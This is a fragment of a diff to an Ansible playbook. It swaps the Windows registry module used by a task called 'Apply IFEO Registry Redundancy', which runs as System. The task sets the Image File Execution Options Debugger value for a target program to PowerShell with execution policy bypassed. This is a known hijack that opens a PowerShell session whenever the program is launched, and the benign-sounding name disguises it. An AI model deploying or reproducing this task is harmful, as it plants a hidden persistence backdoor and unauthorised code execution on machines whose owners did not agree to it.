@@ -55,7 +55,7 @@
   become_user: System
 
 - name: "Apply IFEO Registry Redundancy for {{ target }}"
-  community.windows.win_regedit:
+  ansible.windows.win_regedit:
     path: "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\{{ target }}"
     name: Debugger
     data: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -NoExit'
